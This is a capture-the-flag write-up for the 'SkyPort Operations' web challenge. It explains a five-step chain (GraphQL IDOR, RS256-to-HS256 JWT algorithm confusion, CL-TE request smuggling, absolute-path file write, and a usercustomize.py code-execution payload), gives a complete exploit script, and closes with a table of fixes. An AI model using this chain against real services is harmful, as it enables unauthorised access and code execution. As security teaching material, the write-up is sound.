---
tags:
  - web
  - 0xfun
---

# SkyPort Operations - CTF Writeup

**Challenge URL:** `http://chall.0xfun.org:52705`
**Flag:** `0xfun{0ff1c3r_5mugg13d_p7h_1nt0_41rp0r7}`

---

## Overview

SkyPort Operations is a multi-stage web challenge involving a fake airport internal operations portal. The application is a Python FastAPI app behind a custom reverse-proxy gateway (`lib-gateway-port`). The flag is stored in `/root/flag.txt` and can only be read by a SUID root binary at `/flag`.

The exploit chain combines five distinct vulnerabilities:

1. GraphQL IDOR via Relay Node Interface
2. JWT Algorithm Confusion (RS256 → HS256)
3. HTTP Request Smuggling (CL-TE)
4. Arbitrary File Write via Path Traversal
5. Code Execution via Python `usercustomize.py`

---

## Architecture

```
Client → SecurityGateway (:9000) → Hypercorn/FastAPI (:5000)
```

- **SecurityGateway** (`lib-gateway-port`): A raw-socket reverse proxy that blocks requests to `/internal/*` paths.
- **FastAPI app** (`app.py`): Serves GraphQL (Strawberry), HTML pages, and internal endpoints (`/internal/manifests`, `/internal/upload`).
- **Hypercorn**: ASGI server running 2 workers with `--max-requests 100` (workers restart after 100 requests).
- The app runs as the unprivileged `skyport` user.

---

## Step 1: GraphQL IDOR — Extracting the Staff JWT

### Discovery

The `/departures` page contains a script tag that queries a GraphQL endpoint:

```js
fetch("/graphql", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    query: "{flights{flightNumber destination gate scheduled status}}"
  })
});
```

Introspecting the schema reveals two node types implementing the Relay `Node` interface:

- **`PassengerNode`** — public passenger data
- **`StaffNode`** — includes an `accessToken` field (JWT)

The `staff` query only returns `StaffSummary` (no token), but `StaffNode` is accessible through the generic `node(id:)` query.

### Exploitation

Strawberry GraphQL's Relay implementation uses base64-encoded Global IDs in the format `TypeName:pk`. Staff member `officer_chen` has `pk=2`:

```bash
echo -n "StaffNode:2" | base64
# U3RhZmZOb2RlOjI=
```

```graphql
{
  node(id: "U3RhZmZOb2RlOjI=") {
    ... on StaffNode {
      username
      accessToken
    }
  }
}
```

This returns `officer_chen`'s JWT:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJvZmZpY2VyX2NoZW4iLCJyb2xlIjoic3RhZmYiLCJqd2tzX3VyaSI6Ii9hcGkvNTNiZWFkYzJhZGU0ZjgxOSJ9...
```

Decoded payload:

```json
{
  "sub": "officer_chen",
  "role": "staff",
  "jwks_uri": "/api/53beadc2ade4f819"
}
```

The `jwks_uri` field reveals the public key endpoint.

---

## Step 2: JWT Algorithm Confusion — Forging an Admin Token

### Vulnerability

The JWT verification function in `app.py` (line 389) is fatally flawed:

```python
def _decode_admin_jwt(token: str) -> Optional[dict]:
    payload = jose_jwt.decode(token, RSA_PUBLIC_DER, algorithms=None)
    return payload if payload.get("role") == "admin" else None
```

`algorithms=None` allows the attacker to choose **any** algorithm, including `HS256`. This enables a classic **algorithm confusion attack**: the server's RSA public key (used for RS256 verification) is reused as the HMAC secret for HS256.

### Exploitation

1. Fetch the public key from the JWKS endpoint (same connection to ensure same worker):

```json
GET /api/<random_hex>

{
  "algorithm": "RS256",
  "public_key": "-----BEGIN PUBLIC KEY-----\nMIIBIj..."
}
```

2. Convert PEM to DER format (matching `RSA_PUBLIC_DER` in the app).

3. Sign a forged JWT with `HS256` using the DER public key bytes as the HMAC secret:

```python
from jose import jwt as jose_jwt

admin_token = jose_jwt.encode(
    {"sub": "admin", "role": "admin"},
    der_key,       # RSA public key bytes used as HMAC secret
    algorithm="HS256"
)
```

The server calls `jose_jwt.decode(token, RSA_PUBLIC_DER, algorithms=None)`. Since `algorithms=None` permits HS256, it uses the same `RSA_PUBLIC_DER` bytes as the HMAC key — and the signature validates.

> **Critical detail:** Each Hypercorn worker generates its own RSA key pair at import time. The JWKS fetch and the smuggled request **must** go through the same TCP connection to the gateway, which maintains a persistent backend connection per client, ensuring the same worker handles both.

---

## Step 3: HTTP Request Smuggling (CL-TE) — Bypassing the Gateway

### Vulnerability

The `SecurityGateway` blocks all requests to `/internal/*`:

```python
PROTECTED_PATHS = ["/internal/"]

def check_access_control(self, path: str) -> bool:
    # double URL-decode, normalize dots, check prefix
    ...
    for protected in PROTECTED_PATHS:
        if normalized_path.startswith(protected):
            return True
```

The gateway only understands `Content-Length` for body parsing:

```python
def read_request_body(self, conn, headers, leftover):
    content_length = int(headers.get('content-length', 0))
    # reads exactly content_length bytes
```

It does **not** understand `Transfer-Encoding: chunked`. But the backend (Hypercorn) does, and per HTTP/1.1 spec, `Transfer-Encoding` takes precedence over `Content-Length`.

### Exploitation — CL-TE Desync

```
GET / HTTP/1.1
Host: target
Content-Length: <N>          ← gateway uses this (reads N bytes as body)
Transfer-Encoding: chunked   ← backend uses this (reads chunked body)

0\r\n
\r\n
POST /internal/upload HTTP/1.1    ← smuggled request
Host: localhost
Authorization: Bearer <admin_jwt>
Content-Type: multipart/form-data; boundary=...
Content-Length: ...

<multipart body>
```

**What happens:**

| Component | Sees |
|-----------|------|
| **Gateway** | `GET /` with `Content-Length: N` → path is `/` (allowed) → forwards N bytes of body to backend |
| **Backend** | `GET /` with `Transfer-Encoding: chunked` → reads `0\r\n\r\n` (empty body, end of chunks) → then reads leftover data as a **new pipelined request**: `POST /internal/upload` |

The smuggled request bypasses the gateway's path check entirely.

**Retrieving the response:** The backend sends two responses on the same connection. The gateway reads the first (for `GET /`) and returns it to the client. A follow-up `GET /` request from the client causes the gateway to read the **second** response (for the smuggled request) — a response desync.

```python
# Send smuggling payload
send(carrier_with_smuggled_request)
recv()  # Response 1: home page (for GET /)

# Follow-up to retrieve the smuggled response
send("GET / HTTP/1.1\r\n...")
recv()  # Response 2: upload result (for smuggled POST /internal/upload)
```

---

## Step 4: Arbitrary File Write via Path Traversal

### Vulnerability

The upload handler has a path traversal vulnerability (line 420-421):

```python
async def save_uploaded_file(file: UploadFile) -> Path:
    filename = file.filename or "upload.bin"
    if filename.startswith("/"):
        destination = Path(filename)     # absolute path — no sanitization!
    else:
        safe_name = sanitize_filename(filename)
        destination = UPLOAD_DIR / safe_name
    destination.parent.mkdir(parents=True, exist_ok=True)
    destination.write_bytes(content)
```

When the filename starts with `/`, it's used as an absolute path with **no sanitization**. The `mkdir(parents=True)` call even creates any missing parent directories.

### Constraint

The app runs as the `skyport` user, so only writable directories can be targeted. Testing reveals:

| Path | Writable? |
|------|-----------|
| `/app/app.py` | No (root-owned) |
| `/app/venv/lib/python3.11/site-packages/` | No (root-owned) |
| `/tmp/skyport_uploads/` | Yes (owned by skyport) |
| `/home/skyport/.local/lib/python3.11/site-packages/` | **Yes** (user-owned) |

---

## Step 5: Code Execution via `usercustomize.py`

### Mechanism

Python's `site` module automatically imports `usercustomize.py` from user site-packages on interpreter startup. By writing a malicious `usercustomize.py` to `/home/skyport/.local/lib/python3.11/site-packages/`, any new Python process started as `skyport` will execute it.

### Exploitation

Upload via the smuggled request:

```
filename="/home/skyport/.local/lib/python3.11/site-packages/usercustomize.py"
```

Content:

```python
try:
    import subprocess
    r = subprocess.run(["/flag"], capture_output=True, text=True, timeout=5)
    with open("/tmp/skyport_uploads/flag_out.txt", "w") as f:
        f.write(r.stdout)
        f.write(r.stderr)
except Exception:
    pass
```

The `/flag` binary is SUID root (`chmod 4755`), so it can read `/root/flag.txt` regardless of the calling user.

### Triggering the Payload

Hypercorn is configured with `--max-requests 100`. After 100 requests, each worker process is killed and restarted. The new Python process loads `usercustomize.py`, which:

1. Executes the SUID `/flag` binary
2. Writes the flag to `/tmp/skyport_uploads/flag_out.txt`

Since `/tmp/skyport_uploads/` is mounted as a static file directory:

```python
app.mount("/uploads", StaticFiles(directory="/tmp/skyport_uploads"), name="uploads")
```

The flag is then accessible at:

```
GET /uploads/flag_out.txt
```

```
0xfun{0ff1c3r_5mugg13d_p7h_1nt0_41rp0r7}
```

---

## Full Exploit Script

```python
import socket, json, base64, time
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.backends import default_backend
from jose import jwt as jose_jwt

HOST = "chall.0xfun.org"
PORT = 52705

def send_recv(sock, data, timeout=5):
    sock.sendall(data)
    sock.settimeout(timeout)
    resp = b""
    try:
        while True:
            c = sock.recv(8192)
            if not c: break
            resp += c
            if b"\r\n\r\n" in resp:
                for l in resp.split(b"\r\n"):
                    if l.lower().startswith(b"content-length:"):
                        cl = int(l.split(b":")[1].strip())
                        he = resp.index(b"\r\n\r\n") + 4
                        if len(resp) >= he + cl: return resp
    except socket.timeout: pass
    return resp

def get_body(r):
    return r[r.index(b"\r\n\r\n")+4:] if b"\r\n\r\n" in r else b""

def smuggle(sock, smuggled_bytes):
    cl_body = b"0\r\n\r\n" + smuggled_bytes
    carrier = (f"GET / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
               f"Content-Length: {len(cl_body)}\r\n"
               f"Transfer-Encoding: chunked\r\n\r\n").encode() + cl_body
    send_recv(sock, carrier)
    return send_recv(sock, f"GET / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n\r\n".encode())

# --- Connect (single connection = single backend worker) ---
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

# 1. GraphQL IDOR: extract staff JWT
gql = json.dumps({"query":'{node(id:"U3RhZmZOb2RlOjI="){... on StaffNode{accessToken}}}'})
resp = send_recv(sock, (f"POST /graphql HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
    f"Content-Type: application/json\r\nContent-Length: {len(gql)}\r\n\r\n{gql}").encode())
jwt_tok = json.loads(get_body(resp))["data"]["node"]["accessToken"]
jwks_uri = json.loads(base64.urlsafe_b64decode(jwt_tok.split(".")[1]+"==="))["jwks_uri"]

# 2. Algorithm confusion: forge admin JWT
resp = send_recv(sock, f"GET {jwks_uri} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n\r\n".encode())
pem = json.loads(get_body(resp))["public_key"].encode()
der = load_pem_public_key(pem, backend=default_backend()).public_bytes(
    encoding=serialization.Encoding.DER, format=serialization.PublicFormat.SubjectPublicKeyInfo)
token = jose_jwt.encode({"sub":"admin","role":"admin"}, der, algorithm="HS256")

# 3. Smuggle upload: write usercustomize.py via path traversal
payload = b'''try:
    import subprocess
    r = subprocess.run(["/flag"], capture_output=True, text=True, timeout=5)
    with open("/tmp/skyport_uploads/flag_out.txt", "w") as f:
        f.write(r.stdout + r.stderr)
except: pass
'''
boundary = "----BOUND"
mp = (f"--{boundary}\r\n"
      f'Content-Disposition: form-data; name="file"; '
      f'filename="/home/skyport/.local/lib/python3.11/site-packages/usercustomize.py"\r\n'
      f"Content-Type: application/octet-stream\r\n\r\n").encode() + payload + \
      f"\r\n--{boundary}--\r\n".encode()
smuggled_req = (f"POST /internal/upload HTTP/1.1\r\nHost: localhost\r\n"
    f"Authorization: Bearer {token}\r\nContent-Type: multipart/form-data; "
    f"boundary={boundary}\r\nContent-Length: {len(mp)}\r\n\r\n").encode() + mp
smuggle(sock, smuggled_req)
sock.close()

# 4. Trigger worker restart (--max-requests 100)
for i in range(150):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT)); s.settimeout(3)
        s.sendall(f"GET / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nConnection: close\r\n\r\n".encode())
        s.recv(4096); s.close()
    except: pass

# 5. Read the flag
time.sleep(2)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT)); s.settimeout(5)
s.sendall(f"GET /uploads/flag_out.txt HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nConnection: close\r\n\r\n".encode())
resp = b""
try:
    while True:
        c = s.recv(4096)
        if not c: break
        resp += c
except: pass
print(get_body(resp).decode())
```

---

## Key Takeaways

| Vulnerability | Root Cause | Fix |
|---|---|---|
| GraphQL IDOR | `StaffNode.resolve_node()` returns any user regardless of type | Add authorization checks on node resolution |
| Algorithm Confusion | `algorithms=None` in `jose_jwt.decode()` | Always specify `algorithms=["RS256"]` |
| HTTP Smuggling | Gateway ignores `Transfer-Encoding` | Strip or reject ambiguous `Transfer-Encoding` / `Content-Length` combos |
| Path Traversal | No validation on absolute filenames | Reject filenames starting with `/`; use `sanitize_filename()` for all inputs |
| RCE via usercustomize | Writable user site-packages directory | Run with `PYTHONNOUSERSITE=1` or restrict directory permissions |
